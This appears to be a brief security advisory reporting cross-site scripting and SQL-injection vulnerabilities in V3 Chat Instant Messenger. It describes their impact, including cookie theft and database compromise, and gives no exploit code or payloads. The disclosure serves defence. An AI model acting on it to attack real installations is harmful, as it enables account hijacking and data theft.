V3 Chat Instant Messenger is prone to multiple cross-site scripting and SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.

An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.

A successful exploit could also allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.
